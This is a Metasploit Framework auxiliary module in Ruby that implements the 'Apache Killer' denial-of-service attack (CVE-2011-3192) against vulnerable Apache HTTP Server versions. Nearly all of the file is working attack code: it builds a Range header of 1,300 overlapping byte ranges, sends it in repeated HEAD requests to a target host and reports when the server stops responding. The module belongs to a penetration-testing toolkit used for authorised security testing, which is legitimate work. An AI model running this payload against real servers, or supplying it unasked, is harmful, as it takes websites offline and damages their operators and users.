##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Apache Range header DoS (Apache Killer)',
			'Description'    => %q{
					The byterange filter in the Apache HTTP Server 2.0.x through 2.0.64, and 2.2.x
				through 2.2.19 allows remote attackers to cause a denial of service (memory and
				CPU consumption) via a Range header that expresses multiple overlapping ranges,
				exploit called "Apache Killer"
			},
			'Author'         =>
				[
					'Kingcope', #original discoverer
					'Masashi Fujiwara' #metasploit module
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'BID', '49303'],
					[ 'CVE', '2011-3192'],
					[ 'EDB', '17696'],
					[ 'OSVDB', '74721' ],
				],
			'DisclosureDate' => 'Aug 19 2011'))

		register_options(
			[
				Opt::RPORT(80),
				OptString.new('URI', [ true,  "The request URI", '/']),
				OptInt.new('RLIMIT', [ true,  "Number of requests to send", 50])
			], self.class)
	end

	def run
		uri = normalize_uri(datastore['URI'])
		ranges = ''
		for i in (0..1299) do
			ranges += ",5-" + i.to_s
		end
		for x in 1..datastore['RLIMIT']
			begin
				connect
				print_status("Sending DoS packet #{x} to #{rhost}:#{rport}")

				sploit = "HEAD " + uri + " HTTP/1.1\r\n"
				sploit << "Host: " + rhost + "\r\n"
				sploit << "Range: bytes=0-" + ranges + "\r\n"
				sploit << "Accept-Encoding: gzip\r\n"
				sploit << "Connection: close\r\n\r\n"

				sock.put(sploit)
				disconnect
			rescue ::Rex::ConnectionRefused
				print_status("Unable to connect to #{rhost}:#{rport}.")
			rescue ::Errno::ECONNRESET
				print_status("DoS packet successful. #{rhost} not responding.")
			rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
				print_status("Couldn't connect to #{rhost}:#{rport}")
			rescue ::Timeout::Error, ::Errno::EPIPE
			end
		end
	end
end
